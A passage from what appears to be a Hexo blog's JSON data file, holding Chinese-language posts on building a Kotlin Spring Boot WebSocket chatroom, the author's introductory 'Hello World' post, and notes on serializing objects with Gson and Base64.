punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> disconnect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ChatWsMessageBean<span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> objectMapper<span class=\"token punctuation\">.</span><span class=\"token function\">writeValueAsString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Configuration</span>\n<span class=\"token annotation builtin\">@EnableWebSocket</span>\n<span class=\"token keyword\">class</span> WebSocketConfig <span class=\"token operator\">:</span> WebSocketConfigurer <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">lateinit</span> <span class=\"token keyword\">var</span> chatRoomWsHandler<span class=\"token operator\">:</span> ChatRoomWsHandler\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">registerWebSocketHandlers</span><span class=\"token punctuation\">(</span>registry<span class=\"token operator\">:</span> WebSocketHandlerRegistry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addHandler</span><span class=\"token punctuation\">(</span>chatRoomWsHandler<span class=\"token punctuation\">,</span> <span class=\"token string\">\"chatroom\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">setAllowedOrigins</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对其效果个人还是非常满意的，改天有时间写一个Android端的聊天室</p>\n<p>在全栈的道路上越走越远XD</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Hello-Spring-Boot\"><a href=\"#Hello-Spring-Boot\" class=\"headerlink\" title=\"Hello Spring Boot\"></a>Hello Spring Boot</h1><p>其实之前也有了解过其他的后端实现方式，比如Go的后端（还没学到怎么写接口就放弃了），Node.js的后端（还是整得稀里糊涂的），发现都学不太会。（其实是没时间去仔细琢磨，学习这些语言的后端同时也需要学习这些语言，学习成本较大）</p>\n<p>于是我还是选择了最传统的Spring Boot后端。不过我使用了我喜欢的Kotlin语言来编写，使用Gradle工具来管理依赖库。</p>\n<p>刚上手时便惊讶的发现，Spring Boot框架对java后端的封装真的特别彻底，基本就是几个注解便帮你处理了大部分工作，写起来真的特别的舒服。</p>\n<p>像这样便能实现一个简单的返回json信息的api接口</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@RestController</span>\n<span class=\"token keyword\">class</span> TestController <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/greeting\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">greeting</span><span class=\"token punctuation\">(</span><span class=\"token annotation builtin\">@RequestParam</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> defaultValue <span class=\"token operator\">=</span> <span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">BaseResponseBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello <span class=\"token interpolation variable\">$name</span>\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> BaseResponseBean<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorCode<span class=\"token operator\">:</span> Int <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorMsg<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后我便想写个项目练练手，于是就想到了路姐姐的聊天室后端。路姐姐是用的TypeScript实现的聊天室后端，我便想用Spring Boot实现一个功能类似的。</p>\n<p>代码如下</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> username<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> avatar<span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">object</span> WebSocketMessageType <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OPEN <span class=\"token operator\">=</span> <span class=\"token string\">\"OPEN\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> CLOSE <span class=\"token operator\">=</span> <span class=\"token string\">\"CLOSE\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> MESSAGE <span class=\"token operator\">=</span> <span class=\"token string\">\"MESSAGE\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Component</span>\n<span class=\"token keyword\">class</span> ChatRoomWsHandler <span class=\"token operator\">:</span> <span class=\"token function\">TextWebSocketHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> objectMapper <span class=\"token operator\">=</span> <span class=\"token function\">ObjectMapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> connectedSessions <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>WebSocketSession<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionEstablished</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>OPEN<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> connect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">handleTextMessage</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span> TextMessage<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>MESSAGE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                message<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> send message <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>message<span class=\"token punctuation\">.</span>payload<span class=\"token delimiter variable\">&#125;</span></span> with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionClosed</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> closeStatus<span class=\"token operator\">:</span> CloseStatus<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>CLOSE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> disconnect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ChatWsMessageBean<span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> objectMapper<span class=\"token punctuation\">.</span><span class=\"token function\">writeValueAsString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Configuration</span>\n<span class=\"token annotation builtin\">@EnableWebSocket</span>\n<span class=\"token keyword\">class</span> WebSocketConfig <span class=\"token operator\">:</span> WebSocketConfigurer <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">lateinit</span> <span class=\"token keyword\">var</span> chatRoomWsHandler<span class=\"token operator\">:</span> ChatRoomWsHandler\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">registerWebSocketHandlers</span><span class=\"token punctuation\">(</span>registry<span class=\"token operator\">:</span> WebSocketHandlerRegistry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addHandler</span><span class=\"token punctuation\">(</span>chatRoomWsHandler<span class=\"token punctuation\">,</span> <span class=\"token string\">\"chatroom\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">setAllowedOrigins</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对其效果个人还是非常满意的，改天有时间写一个Android端的聊天室</p>\n<p>在全栈的道路上越走越远XD</p>\n"},{"title":"Hello World！","date":"2021-11-07T16:00:00.000Z","author":"寒雨","top":true,"hide":false,"summary":"于是万物伊始","_content":"# Hello World\n\n> 于是万物伊始\n\n记于 2021/11/9 ，博客由gitblog迁移到hexo，完毕。\n\n之后会陆陆续续上传以前的博文，然后彻底关停之前的博客。\n\n# Self Introduction\n\n> - 就读于CQUPT的一位普通带学生\n> - Bukkit插件开发者，同时也是一位半弃坑的MC服务器服主\n> - 常用开发语言是Kotlin，自从用了Kotlin就回不去Java了\n> - 目前是红岩网校移动开发部安卓方向/Web研发部前端方向的一名学员 （主要发展方向是安卓开发）\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World！\ndate: 2021-11-08\nauthor: 寒雨\ntop: true\nhide: false\nsummary: 于是万物伊始\ncategories: 杂谈\n---\n# Hello World\n\n> 于是万物伊始\n\n记于 2021/11/9 ，博客由gitblog迁移到hexo，完毕。\n\n之后会陆陆续续上传以前的博文，然后彻底关停之前的博客。\n\n# Self Introduction\n\n> - 就读于CQUPT的一位普通带学生\n> - Bukkit插件开发者，同时也是一位半弃坑的MC服务器服主\n> - 常用开发语言是Kotlin，自从用了Kotlin就回不去Java了\n> - 目前是红岩网校移动开发部安卓方向/Web研发部前端方向的一名学员 （主要发展方向是安卓开发）\n\n","slug":"hello-world","published":1,"updated":"2022-11-24T02:58:01.944Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtj001csfkl45gq6z40","content":"<h1 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h1><blockquote>\n<p>于是万物伊始</p>\n</blockquote>\n<p>记于 2021/11/9 ，博客由gitblog迁移到hexo，完毕。</p>\n<p>之后会陆陆续续上传以前的博文，然后彻底关停之前的博客。</p>\n<h1 id=\"Self-Introduction\"><a href=\"#Self-Introduction\" class=\"headerlink\" title=\"Self Introduction\"></a>Self Introduction</h1><blockquote>\n<ul>\n<li>就读于CQUPT的一位普通带学生</li>\n<li>Bukkit插件开发者，同时也是一位半弃坑的MC服务器服主</li>\n<li>常用开发语言是Kotlin，自从用了Kotlin就回不去Java了</li>\n<li>目前是红岩网校移动开发部安卓方向/Web研发部前端方向的一名学员 （主要发展方向是安卓开发）</li>\n</ul>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Hello-World\"><a href=\"#Hello-World\" class=\"headerlink\" title=\"Hello World\"></a>Hello World</h1><blockquote>\n<p>于是万物伊始</p>\n</blockquote>\n<p>记于 2021&#x2F;11&#x2F;9 ，博客由gitblog迁移到hexo，完毕。</p>\n<p>之后会陆陆续续上传以前的博文，然后彻底关停之前的博客。</p>\n<h1 id=\"Self-Introduction\"><a href=\"#Self-Introduction\" class=\"headerlink\" title=\"Self Introduction\"></a>Self Introduction</h1><blockquote>\n<ul>\n<li>就读于CQUPT的一位普通带学生</li>\n<li>Bukkit插件开发者，同时也是一位半弃坑的MC服务器服主</li>\n<li>常用开发语言是Kotlin，自从用了Kotlin就回不去Java了</li>\n<li>目前是红岩网校移动开发部安卓方向&#x2F;Web研发部前端方向的一名学员 （主要发展方向是安卓开发）</li>\n</ul>\n</blockquote>\n"},{"title":"序列化的两种常见做法","date":"2021-07-20T15:52:12.000Z","author":"寒雨","hide":false,"summary":"记录下Java/Kotlin序列化对象的两种做法","_content":"\n最常见的做法无非两种：序列化成**json**或者**base64**\n\n## Json\n\n要将一个实例序列化成Json信息一般都需要借助**外部库**\n\n比较常用的库有两种：谷歌的**gson**，阿里的**fastjson**\n\n由于我接触的开发者们都比较青睐gson，而且Spigot核心甚至内置了一个gson库（虽然版本有点老了）\n\n所以对我个人而言，使用gson进行序列化操作更加容易\n\n只需要短短数行代码，便能轻松的序列化/反序列化一个实例\n\n```kotlin\n// 序列化实例\nval string: String = Gson().toJson(instance)\n// 反序列化\nval obj: Any = Gson().fromJson(string, Any::class.java)\n// 集合操作\nval str: String = Gson().toJson(arrayListOf(\"1\",\"2\"))\nval list: ArrayList<String> = Gson().fromJson(str,object : TypeToken<ArrayList<String>>{}.type)\n```\n\n\n\n但我最开始利用gson序列化的都是一些里面都塞的是原生数据类型的集合或者Map，所以理所当然的认为gson可以直接序列化所有类型的实例\n\n于是我吃了个大亏\n\n在尝试序列化我自己写的类实例化出来的实例时，我发现它们序列化出来都是{}，这导致了我之后反序列化操作造成的**NullPointerException**\n\n要命的是，因为这个空指针，我各种检查自己的代码，检查到怀疑人生，所有的非空检测都做了，就还是会抛出这个异常\n\n说好的**Kotlin**干翻空指针呢！（笑）\n\n直到最后的最后，我检查了数据库中储存的序列化之后储存的数据，才发现这个错误\n\n**原来，Gson序列化自己建的类的实例，是需要做一些操作，将这些类注册到Gson实例中的**\n\n具体操作\n\n```kotlin\n// 代码来自 TabooLib io.izzel.taboolib.kotlin.Serializer\n// 注册对应类的TypeHierarchAdapter才能序列化这个类的实例\n    val gson = GsonBuilder().setPrettyPrinting().excludeFieldsWithoutExposeAnnotation().also {\n        it.registerTypeHierarchyAdapter(Location::class.java, TypeLocation())\n        it.registerTypeHierarchyAdapter(ItemStack::class.java, TypeItemStack())\n        it.registerTypeHierarchyAdapter(SecuredFile::class.java, TypeSecuredFile())\n        it.registerTypeHierarchyAdapter(YamlConfiguration::class.java, TypeYamlConfiguration())\n        SerializerAdapter.map.forEach { (k, v) ->\n            it.registerTypeHierarchyAdapter(k, v)\n        }\n    }.create()!!\n\n// TypeAdapter\n// 这里以Location的TypeAdapter为例\n    class TypeLocation : JsonSerializer<Location>, JsonDeserializer<Location> {\n\n        override fun serialize(a: Location, p1: Type, p2: JsonSerializationContext): JsonElement {\n            return JsonObject().also {\n                it.addProperty(\"world\", a.world!!.name)\n                it.addProperty(\"x\", a.x)\n                it.addProperty(\"y\", a.y)\n                it.addProperty(\"z\", a.z)\n                it.addProperty(\"yaw\", a.yaw)\n                it.addProperty(\"pitch\", a.pitch)\n            }\n        }\n\n        override fun deserialize(a: JsonElement, p1: Type?, p2: JsonDeserializationContext): Location {\n            return Location(\n                Bukkit.getWorld(a.asJsonObject.get(\"world\").asString),\n                a.asJsonObject.get(\"x\").asDouble,\n                a.asJsonObject.get(\"y\").asDouble,\n                a.asJsonObject.get(\"z\").asDouble,\n                a.asJsonObject.get(\"yaw\").asFloat,\n                a.asJsonObject.get(\"pitch\").asFloat\n            )\n        }\n    }\n\n\n```\n\n在GsonBuilder中注册类和Adapter后构造出来的Gson实例便可以序列化/反序列化对应的类\n\n操作算不上复杂，但也不算轻松\n\n对于只是想把实例存数据库的我来说，这些操作还是有些繁琐了\n\n所以，如果只是想把实例扔数据库里储存，使用**Base64**更加合适\n\n## Base64\n\nbase64不需要像gson那样做繁琐的操作，就可以对一个实例进行轻松的序列化/反序列化操作\n\n并且，在现有的Java版本中，使用Base64不再需要借助任何外部库\n\n**唯一的缺点是，它序列出来的字符串并不像Json字符串，可以用肉眼看出来其中蕴含的信息**\n\n但在数据库操作中，我们并不需要让用户知道这些字符的含义，并修改它们\n\n所以，用它序列化实例再扔进SQL实在是再合适不过了\n\n上代码\n\n```kotlin\n// 代码来自SacredHUD\n// Base64 encode\nfun HashMap<String, BitMapData.Personal>.toBase64(): String {\n    ByteArrayOutputStream().use { byteArrayOutputStream ->\n        BukkitObjectOutputStream(byteArrayOutputStream).use { bukkitObjectOutputStream ->\n            bukkitObjectOutputStream.writeObject(this)\n            return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())\n        }\n    }\n}\n\n// Base64 decode\n@Suppress(\"UNCHECKED_CAST\")\nfun String.base64ToBitmapData(): HashMap<String, BitMapData.Personal> {\n    ByteArrayInputStream(Base64.getDecoder().decode(this)).use { byteArrayInputStream ->\n        BukkitObjectInputStream(byteArrayInputStream).use { bukkitObjectInputStream ->\n            return bukkitObjectInputStream.readObject() as HashMap<String, BitMapData.Personal>\n        }\n    }\n}\n```","source":"_posts/how-to-serialize.md","raw":"---\ntitle: 序列化的两种常见做法\ndate: 2021-07-20 23:52:12\nauthor: 寒雨\nhide: false\nsummary: 记录下Java/Kotlin序列化对象的两种做法\ncategories: 笔记\ntags:\n  - Kotlin\n  - Java\n  - 外部库\n---\n\n最常见的做法无非两种：序列化成**json**或者**base64**\n\n## Json\n\n要将一个实例序列化成Json信息一般都需要借助**外部库**\n\n比较常用的库有两种：谷歌的**gson**，阿里的**fastjson**\n\n由于我接触的开发者们都比较青睐gson，而且Spigot核心甚至内置了一个gson库（虽然版本有点老了）\n\n所以对我个人而言，使用gson进行序列化操作更加容易\n\n只需要短短数行代码，便能轻松的序列化/反序列化一个实例\n\n```kotlin\n// 序列化实例\nval string: String = Gson().toJson(instance)\n// 反序列化\nval obj: Any = Gson().fromJson(string, Any::class.java)\n// 集合操作\nval str: String = Gson().toJson(arrayListOf(\"1\",\"2\"))\nval list: ArrayList<String> = Gson().fromJson(str,object : TypeToken<ArrayList<String>>{}.type)\n```\n\n\n\n但我最开始利用gson序列化的都是一些里面都塞的是原生数据类型的集合或者Map，所以理所当然的认为gson可以直接序列化所有类型的实例\n\n于是我吃了个大亏\n\n在尝试序列化我自己写的类实例化出来的实例时，我发现它们序列化出来都是{}，这导致了我之后反序列化操作造成的**NullPointerException**\n\n要命的是，因为这个空指针，我各种检查自己的代码，检查到怀疑人生，所有的非空检测都做了，就还是会抛出这个异常\n\n说好的**Kotlin**干翻空指针呢！（笑）\n\n直到最后的最后，我检查了数据库中储存的序列化之后储存的数据，才发现这个错误\n\n**原来，Gson序列化自己建的类的实例，是需要做一些操作，将这些类注册到Gson实例中的**\n\n具体操作\n\n```kotlin\n// 代码来自 TabooLib io.izzel.taboolib.kotlin.Serializer\n// 注册对应类的TypeHierarchAdapter才能序列化这个类的实例\n    val gson = GsonBuilder().setPrettyPrinting().excludeFieldsWithoutExposeAnnotation().also {\n        it.registerTypeHierarchyAdapter(Location::class.java, TypeLocation())\n        it.registerTypeHierarchyAdapter(ItemStack::class.java, TypeItemStack())\n        it.registerTypeHierarchyAdapter(SecuredFile::class.java, TypeSecuredFile())\n        it.registerTypeHierarchyAdapter(YamlConfiguration::class.java, TypeYamlConfiguration())\n        SerializerAdapter.map.forEach { (k, v) ->\n            it.registerTypeHierarchyAdapter(k, v)\n        }\n    }.create()!!\n\n// TypeAdapter\n// 这里以Location的TypeAdapter为例\n    class TypeLocation : JsonSerializer<Location>, JsonDeserializer<Location> {\n\n        override fun serialize(a: Location, p1: Type, p2: JsonSerializationContext): JsonElement {\n            return JsonObject().also {\n                it.addProperty(\"world\", a.world!!.name)\n                it.addProperty(\"x\", a.x)\n                it.addProperty(\"y\", a.y)\n                it.addProperty(\"z\", a.z)\n                it.addProperty(\"yaw\", a.yaw)\n                it.addProperty(\"pitch\", a.pitch)\n            }\n        }\n\n        override fun deserialize(a: JsonElement, p1: Type?, p2: JsonDeserializationContext): Location {\n            return Location(\n                